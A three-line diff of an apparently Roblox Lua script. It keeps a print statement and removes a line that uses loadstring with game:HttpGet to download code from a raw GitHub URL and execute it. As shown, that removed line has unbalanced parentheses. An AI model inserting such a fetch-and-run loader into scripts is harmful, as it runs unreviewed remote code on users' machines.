@@ -1,3 +1,1 @@
 print("a")
-loadstring(game:HttpGet("https://raw.githubusercontent.com/JustSayy/Test02/refs/heads/main/test")()
-print("ab")
